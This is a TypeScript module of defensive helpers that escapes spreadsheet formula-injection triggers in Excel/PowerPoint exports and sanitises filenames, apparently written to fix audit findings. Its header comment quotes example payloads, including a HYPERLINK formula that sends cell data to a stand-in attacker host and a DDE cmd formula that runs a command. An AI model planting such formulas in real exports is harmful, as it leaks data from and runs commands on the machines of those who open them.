/**
 * Security helpers for Excel / PowerPoint exports.
 *
 * Addresses audit finding F-01 (CVSS v4.0 5.4 – CSV/Spreadsheet Formula Injection,
 * CWE-1236, OWASP A03:2021 Injection, ASVS V5.3.4).
 *
 * Excel and (via embedded Excel objects) PowerPoint evaluate cell contents that
 * begin with =, +, -, @, TAB (\t) or CR (\r) as formulas. Freetext user input
 * that is copied verbatim into cells or textframes therefore becomes an
 * exploit vector:
 *
 *   =HYPERLINK("https://attacker.tld/?d="&A2,"Click")
 *   =cmd|'/c calc'!A0
 *   @SUM(1+1)*cmd|...
 *
 * The fix is defense-in-depth: every user-controlled string written into a
 * spreadsheet cell or a PowerPoint textframe is passed through `safeCell()`.
 * It prefixes a single-quote (')—the standard Excel mechanism for forcing
 * literal text—to any value starting with a trigger character, which neutralises
 * the formula evaluation without visually affecting the displayed content for
 * benign inputs.
 *
 * Length is capped to protect the exporter against DoS via pathological strings.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const MAX_CELL_LENGTH = 32767; // Excel hard limit per cell

export function safeCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  const raw = String(value);
  // Cap length defensively (Excel hard limit is 32767 chars per cell)
  const trimmed = raw.length > MAX_CELL_LENGTH ? raw.slice(0, MAX_CELL_LENGTH) : raw;
  if (FORMULA_TRIGGER.test(trimmed)) {
    return `'${trimmed}`;
  }
  return trimmed;
}

/**
 * Sanitise a user-provided filename component.
 *
 * Addresses audit finding F-06 (CVSS v4.0 2.1 – Filename Injection, CWE-641,
 * OWASP A03:2021, ASVS V12.3). Strips all characters except letters (any
 * script), digits, underscore and hyphen; collapses runs to a single
 * underscore; caps length to 64 to prevent FS issues and Right-to-Left
 * Override attacks (U+202E) hiding a double-extension trick.
 */
export function safeFilename(name: string, fallback = "export"): string {
  if (!name) return fallback;
  const cleaned = name
    .replace(/[^\p{L}\p{N}_-]+/gu, "_")
    .replace(/^_+|_+$/g, "")
    .slice(0, 64);
  return cleaned || fallback;
}